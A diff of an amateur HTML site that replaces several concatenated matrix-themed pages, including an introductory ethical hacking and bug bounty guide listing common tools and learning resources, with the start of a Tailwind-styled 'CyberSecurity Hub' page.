@@ -1,1613 +1,353 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SIMRAN404CYBERX</title>
+    <title>CyberSecurity Hub | Ethical Hacking & Bug Bounty</title>
+    <script src="https://cdn.tailwindcss.com"></script>
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=VT323&display=swap');
+        
         body {
-            margin: 0;
-            padding: 0;
+            font-family: 'Space Mono', monospace;
+            background-color: #0a0a0a;
+            color: #00ff41;
             overflow-x: hidden;
-            color: #00ff00;
-            font-family: 'Courier New', monospace;
-            background-color: black;
             position: relative;
         }
-
-        #matrix {
+        
+        .matrix-bg {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             z-index: -1;
-            opacity: 0.15;
-        }
-
-        .content {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 2rem;
-            position: relative;
-            z-index: 1;
-        }
-
-        header {
-            text-align: center;
-            margin-bottom: 3rem;
-            border-bottom: 1px solid #00ff00;
-            padding-bottom: 2rem;
-        }
-
-        h1 {
-            font-size: 3rem;
-            margin-bottom: 0.5rem;
-            color: #00ff00;
-            text-shadow: 0 0 10px #00ff00;
-        }
-
-        h2 {
-            color: #00ff0080;
-            font-size: 1.5rem;
-            margin-top: 0;
-        }
-
-        .card {
-            background-color: rgba(0, 0, 0, 0.7);
-            border: 1px solid #00ff00;
-            border-radius: 5px;
-            padding: 2rem;
-            margin-bottom: 2rem;
-            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
-        }
-
-        .card h3 {
-            margin-top: 0;
-            color: #00ff00;
-        }
-
-        .card p {
-            line-height: 1.6;
-            color: #00ff00cc;
-        }
-
-        .flex-grid {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 2rem;
-        }
-
-        .col {
-            flex: 1;
-            min-width: 250px;
-        }
-
-        footer {
-            text-align: center;
-            margin-top: 3rem;
-            padding-top: 2rem;
-            border-top: 1px solid #00ff00;
-            color: #00ff0080;
-            font-size: 0.9rem;
-        }
-
-        @media (max-width: 768px) {
-            h1 {
-                font-size: 2rem;
-            }
-            
-            .content {
-                padding: 1rem;
-            }
-        }
-    </style>
-</head>
-<body>
-    <canvas id="matrix"></canvas>
-    
-    <div class="content">
-        <header>
-            <h1>SIMRAN404CYBERX</h1>
-            <h2>SYSTEM ACCESS INTERFACE</h2>
-        </header>
-
-        <div class="flex-grid">
-            <div class="col">
-                <div class="card">
-                    <h3>SYSTEM STATUS</h3>
-                    <p>
-                        Core systems operational at 98.7% efficiency. Critical processes running smoothly across all sectors.
-                        Network encryption protocols active. AI monitoring systems engaged.
-                    </p>
-                </div>
-                
-                <div class="card">
-                    <h3>SECURITY ALERT</h3>
-                    <p>
-                        Multiple unauthorized access attempts detected and neutralized. Firewalls reinforced.
-                        Encryption key rotation completed ahead of schedule.
-                    </p>
-                </div>
-            </div>
-            
-            <div class="col">
-                <div class="card">
-                    <h3>DATA STREAMS</h3>
-                    <p>
-                        Processing 4.7TB of streaming data per second. Network latency below acceptable thresholds.
-                        All nodes reporting optimal performance metrics.
-                    </p>
-                </div>
-                
-                <div class="card">
-                    <h3>ADMIN ACCESS</h3>
-                    <p>
-                        Secure login required for elevated privileges. Biometric verification standing by.
-                        Terminal session timeout in T-15:00.
-                    </p>
-                </div>
-            </div>
-        </div>
-        
-        <footer>
-            @sarveshbharti2025
-        </footer>
-    </div>
-
-    <script>
-        const canvas = document.getElementById('matrix');
-        const ctx = canvas.getContext('2d');
-        
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-        
-        const chars = "SARVESH BHARTI SIMRAN BHARTI ADVIK MEHER 22 FEB 13 DEC"
-        const fontSize = 20;
-        const columns = canvas.width / fontSize;
-        
-        // Create array of drops for each column
-        const drops = [];
-        for(let i = 0; i < columns; i++) {
-            drops[i] = 1; 
+            opacity: 0.1;
+            pointer-events: none;
         }
         
-        function draw() {
-            // Black background with opacity to create trail effect
-            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            
-            ctx.fillStyle = '#00ff00';
-            ctx.font = fontSize + 'px monospace';
-            
-            // Draw the characters
-            for(let i = 0; i < drops.length; i++) {
-                const text = chars[Math.floor(Math.random() * chars.length)];
-                
-                // Add randomness to y position
-                const y = drops[i] * fontSize;
-                const x = i * fontSize;
-                
-                ctx.fillText(text, x, y);
-                
-                // Randomly reset drops to top of screen
-                if(y > canvas.height && Math.random() > 0.975) {
-                    drops[i] = 0;
-                }
-                
-                drops[i]++;
-            }
-        }
-        
-        // Handle window resize
-        window.addEventListener('resize', function() {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-        });
-        
-        // Animation loop (adjust 30 to change speed - higher is faster)
-        setInterval(draw, 30);
-    </script>
-</body>
-</html>
-
-
-
-
-
-
-
-
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CyberSec Pro - Ethical Hacking & Bug Bounty</title>
-    <style>
-        :root {
-            --primary: #0275d8;
-            --primary-dark: #025aa5;
-            --dark: #292b2c;
-            --darker: #1a1a1a;
-            --light: #f7f7f7;
-            --danger: #d9534f;
-            --warning: #f0ad4e;
-            --success: #5cb85c;
-            --info: #5bc0de;
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Courier New', monospace;
-        }
-
-        body {
-            background-color: var(--darker);
-            color: var(--light);
-            display: flex;
-            min-height: 100vh;
-        }
-
-        /* Sidebar styling */
         .sidebar {
-            width: 250px;
-            background-color: var(--dark);
-            padding: 20px;
-            position: fixed;
-            height: 100vh;
-            overflow-y: auto;
-            border-right: 1px solid #444;
+            transform: translateX(-100%);
+            transition: transform 0.3s ease;
         }
-
-        .sidebar-header {
-            margin-bottom: 30px;
-            text-align: center;
-            padding-bottom: 10px;
-            border-bottom: 1px solid #444;
+        
+        .sidebar.open {
+            transform: translateX(0);
         }
-
-        .sidebar-header img {
-            width: 80px;
-            height: 80px;
-            margin-bottom: 10px;
-        }
-
-        .nav-btn {
-            display: block;
-            width: 100%;
-            padding: 12px 15px;
-            margin-bottom: 10px;
-            background-color: var(--primary);
-            color: white;
-            border: none;
-            text-align: left;
-            border-radius: 4px;
-            cursor: pointer;
-            font-weight: bold;
-            transition: all 0.3s ease;
-        }
-
-        .nav-btn:hover {
-            background-color: var(--primary-dark);
-            transform: translateX(5px);
-        }
-
-        .nav-btn.active {
-            background-color: var(--danger);
-        }
-
-        /* Main content */
-        .main-content {
-            margin-left: 250px;
-            padding: 30px;
-            width: calc(100% - 250px);
-        }
-
+        
         .content-section {
             display: none;
-            animation: fadeIn 0.5s ease;
-            background-color: var(--dark);
-            padding: 30px;
-            border-radius: 5px;
-            margin-bottom: 30px;
-            border: 1px solid #444;
         }
-
+        
         .content-section.active {
             display: block;
+            animation: fadeIn 0.5s ease;
         }
-
-        h1, h2, h3 {
-            color: var(--primary);
-            margin-bottom: 20px;
-        }
-
-        p {
-            line-height: 1.6;
-            margin-bottom: 15px;
-        }
-
-        .card {
-            background-color: rgba(0, 0, 0, 0.2);
-            padding: 20px;
-            border-radius: 5px;
-            margin-bottom: 20px;
-            border-left: 4px solid var(--primary);
-        }
-
-        .card h3 {
-            color: var(--info);
-        }
-
-        .highlight {
-            background-color: rgba(0, 0, 0, 0.3);
-            padding: 2px 5px;
-            border-radius: 3px;
-            color: var(--warning);
-            font-family: monospace;
-        }
-
+        
         @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
+            from { opacity: 0; }
+            to { opacity: 1; }
         }
-
-        /* Responsive */
-        @media (max-width: 768px) {
-            .sidebar {
-                width: 100%;
-                height: auto;
-                position: relative;
-            }
-            .main-content {
-                margin-left: 0;
-                width: 100%;
-            }
+        
+        .glow-text {
+            text-shadow: 0 0 10px #00ff41, 0 0 20px #00ff41;
+        }
+        
+        .btn-hover {
+            transition: all 0.3s ease;
+        }
+        
+        .btn-hover:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 255, 65, 0.3);
+        }
+        
+        .code-block {
+            background-color: #111;
+            border-left: 3px solid #00ff41;
         }
     </style>
 </head>
 <body>
-    <!-- Sidebar Navigation -->
-    <aside class="sidebar">
-        <div class="sidebar-header">
-            <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/665a7761-d1f9-4b8b-ac5f-88942ae71fa0.png" alt="CyberSec Pro logo featuring a shield with binary code background in glowing blue and green colors" />
-            <h2>CyberSec Pro</h2>
-        </div>
-        
-        <button class="nav-btn active" data-target="overview">Overview</button>
-        <button class="nav-btn" data-target="ethical-hacking">Ethical Hacking</button>
-        <button class="nav-btn" data-target="penetration-testing">Penetration Testing</button>
-        <button class="nav-btn" data-target="bug-bounty">Bug Bounty</button>
-        <button class="nav-btn" data-target="tools">Hacking Tools</button>
-        <button class="nav-btn" data-target="resources">Resources</button>
-    </aside>
-
-    <!-- Main Content -->
-    <main class="main-content">
-        <!-- Overview Section -->
-        <section id="overview" class="content-section active">
-            <h1>Welcome to CyberSec Pro</h1>
-            <p>Your premier resource for ethical hacking, penetration testing, and bug bounty programs. We provide expert knowledge, tools, and techniques to help you secure systems and find vulnerabilities responsibly.</p>
-            
-            <div class="card">
-                <h3>Why Cybersecurity Matters</h3>
-                <p>In today's digital world, cyber threats are evolving at an unprecedented rate. Our mission is to:</p>
-                <ul style="margin-left: 20px; margin-bottom: 15px;">
-                    <li>Educate the next generation of cybersecurity professionals</li>
-                    <li>Promote ethical hacking practices</li>
-                    <li>Provide real-world penetration testing scenarios</li>
-                    <li>Connect skilled researchers with bug bounty programs</li>
-                </ul>
-            </div>
-
-            <div class="card">
-                <h3>Getting Started</h3>
-                <p>Begin your cybersecurity journey by exploring our resources:</p>
-                <ul style="margin-left: 20px; margin-bottom: 15px;">
-                    <li>Learn the basics of ethical hacking</li>
-                    <li>Understand different types of penetration tests</li>
-                    <li>Discover how to participate in bug bounty programs</li>
-                    <li>Explore our recommended tools and resources</li>
-                </ul>
-            </div>
-
-            <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/8a9c6195-4928-4431-92ef-aa2675f9d195.png" alt="Cybersecurity concept illustration showing a hacker with hoodie typing on laptop with security shield and lock icons floating in the background" style="width: 100%; border-radius: 5px; margin-top: 20px;" />
-        </section>
-
-        <!-- Ethical Hacking Section -->
-        <section id="ethical-hacking" class="content-section">
-            <h1>Ethical Hacking</h1>
-            <p>Ethical hacking involves authorized attempts to gain unauthorized access to computer systems, applications, or data to identify vulnerabilities that malicious hackers could exploit.</p>
-            
-            <div class="card">
-                <h3>Types of Ethical Hackers</h3>
-                <p>Different roles in ethical hacking:</p>
-                <ul style="margin-left: 20px; margin-bottom: 15px;">
-                    <li><span class="highlight">White Hat Hackers</span>: Security professionals who help organizations</li>
-                    <li><span class="highlight">Black Hat Hackers</span>: Malicious hackers (what we defend against)</li>
-                    <li><span class="highlight">Grey Hat Hackers</span>: Somewhere in between</li>
-                </ul>
-            </div>
-
-            <div class="card">
-                <h3>Common Attack Vectors</h3>
-                <p>Popular methods used in ethical hacking assessments:</p>
-                <ul style="margin-left: 20px; margin-bottom: 15px;">
-                    <li>Social Engineering (Phishing, Pretexting)</li>
-                    <li>Network Scanning and Enumeration</li>
-                    <li>Web Application Attacks (SQLi, XSS, CSRF)</li>
-                    <li>Privilege Escalation Techniques</li>
-                    <li>Password Cracking</li>
-                </ul>
-            </div>
-        </section>
-
-        <!-- Penetration Testing Section -->
-        <section id="penetration-testing" class="content-section">
-            <h1>Penetration Testing</h1>
-            <p>Penetration testing (pentesting) is a simulated cyber attack against your computer system to check for exploitable vulnerabilities.</p>
-            
-            <div class="card">
-                <h3>Penetration Testing Methodology</h3>
-                <ol style="margin-left: 20px; margin-bottom: 15px;">
-                    <li><span class="highlight">Planning</span>: Define scope and goals</li>
-                    <li><span class="highlight">Reconnaissance</span>: Gather intelligence</li>
-                    <li><span class="highlight">Discovery</span>: Scan and enumerate</li>
-                    <li><span class="highlight">Attack</span>: Exploit vulnerabilities</li>
-                    <li><span class="highlight">Reporting</span>: Document findings</li>
-                </ol>
-            </div>
-
-            <div class="card">
-                <h3>Types of Penetration Tests</h3>
-                <p>Different approaches to pentesting:</p>
-                <ul style="margin-left: 20px; margin-bottom: 15px;">
-                    <li>Network Services Testing</li>
-                    <li>Web Application Testing</li>
-                    <li>Wireless Security Testing</li>
-                    <li>Social Engineering Tests</li>
-                    <li>Physical Security Tests</li>
-                </ul>
-            </div>
-        </section>
-
-        <!-- Bug Bounty Section -->
-        <section id="bug-bounty" class="content-section">
-            <h1>Bug Bounty Programs</h1>
-            <p>Bug bounty programs reward researchers for finding and reporting security vulnerabilities to organizations.</p>
-            
-            <div class="card">
-                <h3>Popular Bug Bounty Platforms</h3>
-                <ul style="margin-left: 20px; margin-bottom: 15px;">
-                    <li>HackerOne</li>
-                    <li>Bugcrowd</li>
-                    <li>Synack</li>
-                    <li>Open Bug Bounty</li>
-                </ul>
-            </div>
-
-            <div class="card">
-                <h3>How to Start in Bug Bounties</h3>
-                <p>Steps to become a successful bug bounty hunter:</p>
-                <ol style="margin-left: 20px; margin-bottom: 15px;">
-                    <li>Learn web and application security fundamentals</li>
-                    <li>Practice on legal platforms like Hacker101, PentesterLab</li>
-                    <li>Choose beginner-friendly programs (e.g., those with private invitations)</li>
-                    <li>Start with simple vulnerabilities (XSS, IDOR, CSRF)</li>
-                    <li>Document everything clearly in your reports</li>
-                </ol>
-            </div>
-        </section>
-
-        <!-- Tools Section -->
-        <section id="tools" class="content-section">
-            <h1>Essential Hacking Tools</h1>
-            <p>A collection of essential tools for ethical hacking and penetration testing.</p>
-            
-            <div class="card">
-                <h3>Network Scanning & Enumeration</h3>
-                <ul style="margin-left: 20px; margin-bottom: 15px;">
-                    <li><span class="highlight">Nmap</span>: Network mapping tool</li>
-                    <li><span class="highlight">Wireshark</span>: Packet analyzer</li>
-                    <li><span class="highlight">Netcat</span>: Swiss army knife of networking</li>
-                </ul>
-            </div>
-
-            <div class="card">
-                <h3>Web Application Testing</h3>
-                <ul style="margin-left: 20px; margin-bottom: 15px;">
-                    <li><span class="highlight">Burp Suite</span>: Web proxy</li>
-                    <li><span class="highlight">OWASP ZAP</span>: Open source web scanner</li>
-                    <li><span class="highlight">SQLmap</span>: Automated SQL injection</li>
-                </ul>
-            </div>
-
-            <div class="card">
-                <h3>Password Cracking</h3>
-                <ul style="margin-left: 20px; margin-bottom: 15px;">
-                    <li><span class="highlight">John the Ripper</span>: Password cracker</li>
-                    <li><span class="highlight">Hashcat</span>: Advanced password recovery</li>
-                </ul>
-            </div>
-        </section>
-
-        <!-- Resources Section -->
-        <section id="resources" class="content-section">
-            <h1>Learning Resources</h1>
-            <p>Expand your cybersecurity knowledge with these resources.</p>
-            
-            <div class="card">
-                <h3>Books</h3>
-                <ul style="margin-left: 20px; margin-bottom: 15px;">
-                    <li>The Web Application Hacker's Handbook</li>
-                    <li>Hacking: The Art of Exploitation</li>
-                    <li>Penetration Testing: A Hands-On Introduction</li>
-                </ul>
-            </div>
-
-            <div class="card">
-                <h3>Online Courses</h3>
-                <ul style="margin-left: 20px; margin-bottom: 15px;">
-                    <li>Offensive Security Certified Professional (OSCP)</li>
-                    <li>eLearnSecurity eJPT</li>
-                    <li>Bugcrowd University</li>
-                </ul>
-            </div>
-
-            <div class="card">
-                <h3>Practice Platforms</h3>
-                <ul style="margin-left: 20px; margin-bottom: 15px;">
-                    <li>Hack The Box</li>
-                    <li>TryHackMe</li>
-                    <li>OverTheWire</li>
-                    <li>Vulnhub</li>
-                </ul>
-            </div>
-        </section>
-    </main>
-
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            // Get all navigation buttons and content sections
-            const navButtons = document.querySelectorAll('.nav-btn');
-            const contentSections = document.querySelectorAll('.content-section');
-            
-            // Add click event listeners to each button
-            navButtons.forEach(button => {
-                button.addEventListener('click', function() {
-                    // Remove active class from all buttons and sections
-                    navButtons.forEach(btn => btn.classList.remove('active'));
-                    contentSections.forEach(section => section.classList.remove('active'));
-                    
-                    // Add active class to clicked button
-                    this.classList.add('active');
-                    
-                    // Show corresponding section
-                    const targetSection = document.getElementById(this.dataset.target);
-                    if (targetSection) {
-                        targetSection.classList.add('active');
-                    }
-                });
-            });
-
-            // Make sure overview is visible by default if no hash in URL
-            if (!window.location.hash) {
-                document.querySelector('.nav-btn[data-target="overview"]').click();
-            } else {
-                const target = window.location.hash.substring(1);
-                const btn = document.querySelector(`.nav-btn[data-target="${target}"]`);
-                if (btn) btn.click();
-            }
-        });
-    </script>
-</body>
-</html>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-
+    <!-- Matrix Background Canvas -->
+    <canvas id="matrix" class="matrix-bg"></canvas>
     
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>| Neon Matrix</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        :root {
-            --primary: #4361ee;
-            --secondary: #3f37c9;
-            --accent: #4cc9f0;
-            --dark: #0b132b;
-            --light: #f8f9fa;
-            --success: #4bb543;
-            --warning: #f4a261;
-            --danger: #e63946;
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-
-        body {
-            background-color: var(--light);
-            color: var(--dark);
-            line-height: 1.6;
-        }
-
-        .container {
-            width: 100%;
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 20px;
-        }
-
-        /* Header */
-        header {
-            background-color: transparent;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            position: fixed;
-            width: 100%;
-            top: 0;
-            z-index: 1000;
-        }
-
-        nav {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 20px 0;
-        }
-
-        .logo {
-            font-size: 24px;
-            font-weight: 700;
-            color: var(--primary);
-            text-decoration: none;
-            display: flex;
-            align-items: center;
-        }
-
-        .logo i {
-            margin-right: 10px;
-            font-size: 28px;
-        }
-
-        .nav-links {
-            display: flex;
-            list-style: none;
-        }
-
-        .nav-links li {
-            margin-left: 30px;
-        }
-
-        .nav-links a {
-            text-decoration: none;
-            color: var(--dark);
-            font-weight: 500;
-            transition: color 0.3s;
-        }
-
-        .nav-links a:hover {
-            color: var(--primary);
-        }
-
-        .menu-toggle {
-            display: none;
-            cursor: pointer;
-            font-size: 24px;
-        }
-
-        /* Hero Section */
-        .hero {
-            padding: 180px 0 100px;
-            text-align: center;
-            background: linear-gradient(135deg, rgba(248, 249, 250, 0.9) 0%, rgba(228, 229, 247, 0.9) 100%);
-        }
-
-        .hero h1 {
-            font-size: 48px;
-            margin-bottom: 20px;
-            color: var(--dark);
-        }
-
-        .hero p {
-            font-size: 20px;
-            max-width: 700px;
-            margin: 0 auto 40px;
-            color: #555;
-        }
-
-        .cta-button {
-            display: inline-block;
-            padding: 12px 30px;
-            background-color: var(--primary);
-            color: white;
-            border-radius: 50px;
-            text-decoration: none;
-            font-weight: 600;
-            transition: all 0.3s;
-            border: 2px solid var(--primary);
-        }
-
-        .cta-button:hover {
-            background-color: transparent;
-            color: var(--primary);
-        }
-
-        .secondary-button {
-            display: inline-block;
-            padding: 12px 30px;
-            background-color: transparent;
-            color: var(--primary);
-            border-radius: 50px;
-            text-decoration: none;
-            font-weight: 600;
-            transition: all 0.3s;
-            border: 2px solid var(--primary);
-            margin-left: 15px;
-        }
-
-        .secondary-button:hover {
-            background-color: var(--primary);
-            color: white;
-        }
-
-        /* Features Section */
-        .features {
-            padding: 100px 0;
-            background-color: white;
-        }
-
-        .section-title {
-            text-align: center;
-            margin-bottom: 60px;
-        }
-
-        .section-title h2 {
-            font-size: 36px;
-            color: var(--dark);
-            margin-bottom: 15px;
-        }
-
-        .section-title p {
-            max-width: 600px;
-            margin: 0 auto;
-            color: #666;
-        }
-
-        .features-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 30px;
-        }
-
-        .feature-card {
-            background-color: var(--light);
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
-            transition: transform 0.3s, box-shadow 0.3s;
-        }
-
-        .feature-card:hover {
-            transform: translateY(-10px);
-            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.1);
-        }
-
-        .feature-icon {
-            font-size: 40px;
-            color: var(--primary);
-            margin-bottom: 20px;
-        }
-
-        .feature-card h3 {
-            font-size: 22px;
-            margin-bottom: 15px;
-            color: var(--dark);
-        }
-
-        /* Team Section */
-        .team {
-            padding: 100px 0;
-            background-color: var(--light);
-        }
-
-        .team-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 30px;
-        }
-
-        .team-card {
-            background-color: white;
-            border-radius: 10px;
-            overflow: hidden;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
-            transition: transform 0.3s;
-        }
-
-        .team-card:hover {
-            transform: translateY(-10px);
-        }
-
-        .team-image {
-            height: 250px;
-            overflow: hidden;
-        }
-
-        .team-image img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            transition: transform 0.5s;
-        }
-
-        .team-card:hover .team-image img {
-            transform: scale(1.1);
-        }
-
-        .team-info {
-            padding: 20px;
-            text-align: center;
-        }
-
-        .team-info h3 {
-            margin-bottom: 5px;
-            color: var(--dark);
-        }
-
-        .team-info p {
-            color: var(--primary);
-            font-weight: 500;
-            margin-bottom: 15px;
-        }
-
-        .social-links {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-        }
-
-        .social-links a {
-            color: var(--dark);
-            transition: color 0.3s;
-        }
-
-        .social-links a:hover {
-            color: var(--primary);
-        }
-
-        /* Testimonials */
-        .testimonials {
-            padding: 100px 0;
-            background-color: white;
-        }
-
-        .testimonials-container {
-            max-width: 800px;
-            margin: 0 auto;
-        }
-
-        .testimonial {
-            background-color: var(--light);
-            padding: 30px;
-            border-radius: 10px;
-            margin-bottom: 30px;
-        }
-
-        .testimonial-content {
-            position: relative;
-            margin-bottom: 20px;
-        }
-
-        .testimonial-content p {
-            font-style: italic;
-            font-size: 18px;
-        }
-
-        .testimonial-content::before {
-            content: '"';
-            font-size: 60px;
-            color: var(--primary);
-            opacity: 0.2;
-            position: absolute;
-            top: -20px;
-            left: -10px;
-        }
-
-        .testimonial-author {
-            display: flex;
-            align-items: center;
-        }
-
-        .author-image {
-            width: 50px;
-            height: 50px;
-            border-radius: 50%;
-            overflow: hidden;
-            margin-right: 15px;
-        }
-
-        .author-image img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-
-        .author-info h4 {
-            margin-bottom: 5px;
-        }
-
-        .author-info p {
-            font-size: 14px;
-            color: #777;
-        }
-
-        /* Contact Section */
-        .contact {
-            padding: 100px 0;
-            background-color: var(--light);
-        }
-
-        .contact-container {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 50px;
-        }
-
-        .contact-info h3 {
-            font-size: 24px;
-            margin-bottom: 20px;
-            color: var(--dark);
-        }
-
-        .contact-info p {
-            margin-bottom: 30px;
-            color: #666;
-        }
-
-        .contact-details {
-            margin-bottom: 30px;
-        }
-
-        .contact-item {
-            display: flex;
-            margin-bottom: 15px;
-        }
-
-        .contact-item i {
-            font-size: 20px;
-            color: var(--primary);
-            margin-right: 15px;
-        }
-
-        .contact-social {
-            display: flex;
-            gap: 15px;
-        }
-
-        .contact-social a {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            width: 40px;
-            height: 40px;
-            background-color: var(--primary);
-            color: white;
-            border-radius: 50%;
-            transition: all 0.3s;
-        }
-
-        .contact-social a:hover {
-            background-color: var(--secondary);
-            transform: translateY(-5px);
-        }
-
-        .contact-form input,
-        .contact-form textarea {
-            width: 100%;
-            padding: 12px 15px;
-            margin-bottom: 20px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            font-size: 16px;
-            transition: border-color 0.3s;
-        }
-
-        .contact-form input:focus,
-        .contact-form textarea:focus {
-            outline: none;
-            border-color: var(--primary);
-        }
-
-        .contact-form textarea {
-            height: 150px;
-            resize: vertical;
-        }
-
-        /* Footer */
-        footer {
-            background-color: var(--dark);
-            color: transparent;
-            padding: 50px 0 20px;
-        }
-
-        .footer-container {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 30px;
-            margin-bottom: 40px;
-        }
-
-        .footer-col h3 {
-            font-size: 20px;
-            margin-bottom: 20px;
-            position: relative;
-            padding-bottom: 10px;
-        }
-
-        .footer-col h3::after {
-            content: '';
-            position: absolute;
-            left: 0;
-            bottom: 0;
-            width: 50px;
-            height: 2px;
-            background-color: var(--primary);
-        }
-
-        .footer-col p {
-            margin-bottom: 20px;
-            color: #bbb;
-        }
-
-        .footer-links {
-            list-style: none;
-        }
-
-        .footer-links li {
-            margin-bottom: 10px;
-        }
-
-        .footer-links a {
-            color: #bbb;
-            text-decoration: none;
-            transition: color 0.3s;
-        }
-
-        .footer-links a:hover {
-            color: var(--primary);
-        }
-
-        .copyright {
-            text-align: center;
-            padding-top: 20px;
-            border-top: 1px solid #444;
-            color: #bbb;
-            font-size: 14px;
-        }
-
-        /* Scroll to Top Button */
-        .scroll-top {
-            position: fixed;
-            bottom: 30px;
-            right: 30px;
-            width: 50px;
-            height: 50px;
-            background-color: var(--primary);
-            color: white;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 20px;
-            cursor: pointer;
-            opacity: 0;
-            visibility: hidden;
-            transition: all 0.3s;
-            z-index: 999;
-        }
-
-        .scroll-top.active {
-            opacity: 1;
-            visibility: visible;
-        }
-
-        .scroll-top:hover {
-            background-color: var(--secondary);
-        }
-
-        /* Responsive Styles */
-        @media (max-width: 992px) {
-            .hero h1 {
-                font-size: 40px;
-            }
-
-            .hero p {
-                font-size: 18px;
-            }
-        }
-
-        @media (max-width: 768px) {
-            .menu-toggle {
-                display: block;
-            }
-
-            .nav-links {
-                position: fixed;
-                top: 80px;
-                left: -100%;
-                width: 100%;
-                height: calc(100vh - 80px);
-                background-color: white;
-                flex-direction: column;
-                align-items: center;
-                padding: 40px 0;
-                transition: left 0.3s;
-                box-shadow: 0 5px 10px rgba(0, 0, 0, 0.1);
-            }
-
-            .nav-links.active {
-                left: 0;
-            }
-
-            .nav-links li {
-                margin: 15px 0;
-            }
-
-            .secondary-button {
-                margin-left: 0;
-                margin-top: 15px;
-            }
-
-            .hero {
-                padding: 150px 0 80px;
-            }
-
-            .hero h1 {
-                font-size: 36px;
-            }
-
-            .hero p {
-                font-size: 16px;
-            }
-        }
-
-        @media (max-width: 576px) {
-            .section-title h2 {
-                font-size: 30px;
-            }
-        }
-    </style>
-</head>
-<body>
-    <!-- Header -->
-    <heade> 
-    </heade> <div class="container">
-            <nav>
-                <a href="#" class="logo">
-                    <i class="fas fa-bolt"></i>Nexus
-                </a>
-                <div class="menu-toggle">
-                    <i class="fas fa-bars"></i>
-                </div>
-                <ul class="nav-links">
-                    <li><a href="#">Home</a></li>
-                    <li><a href="#features">Features</a></li>
-                    <li><a href="#team">Team</a></li>
-                    <li><a href="#testimonials">Testimonials</a></li>
-                    <li><a href="#contact">Contact</a></li>
-                </ul>
-            </nav>
-        </div>
-    </header>
-
-
-<html>
-    <body>
-    <script>
-        const canvas = document.getElementById('matrix');
-        const ctx = canvas.getContext('2d');
-        
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-        
-        const chars = "SARVESH BHARTI SIMRAN BHARTI ADVIK MEHER 22 FEB 13 DEC"
-        const fontSize = 20;
-        const columns = canvas.width / fontSize;
-        
-        // Create array of drops for each column
-        const drops = [];
-        for(let i = 0; i < columns; i++) {
-            drops[i] = 1; 
-        }
-        
-        function draw() {
-            // Black background with opacity to create trail effect
-            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            
-            ctx.fillStyle = '#00ff00';
-            ctx.font = fontSize + 'px monospace';
-            
-            // Draw the characters
-            for(let i = 0; i < drops.length; i++) {
-                const text = chars[Math.floor(Math.random() * chars.length)];
-                
-                // Add randomness to y position
-                const y = drops[i] * fontSize;
-                const x = i * fontSize;
-                
-                ctx.fillText(text, x, y);
-                
-                // Randomly reset drops to top of screen
-                if(y > canvas.height && Math.random() > 0.975) {
-                    drops[i] = 0;
-                }
-                
-                drops[i]++;
-            }
-        }
-        
-        // Handle window resize
-        window.addEventListener('resize', function() {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-        });
-        
-        // Animation loop (adjust 30 to change speed - higher is faster)
-        setInterval(draw, 30);
-    </script>
-</body>
-</html>
-
-
+    <!-- Sidebar Toggle Button -->
+    <button id="sidebarToggle" class="fixed top-4 left-4 z-50 bg-black text-green-400 p-2 rounded-md border border-green-400 btn-hover">
+        ☰ Menu
+    </button>
     
-
-    <!-- Hero Section -->
-    <section class="hero">
-        <div class="container">
-            <h1>WELCOME TO THE DARK SIDE OF KNOWLEDGE Unlocking the Secrets of Ethical Hacking & Cybersecurity</h1>
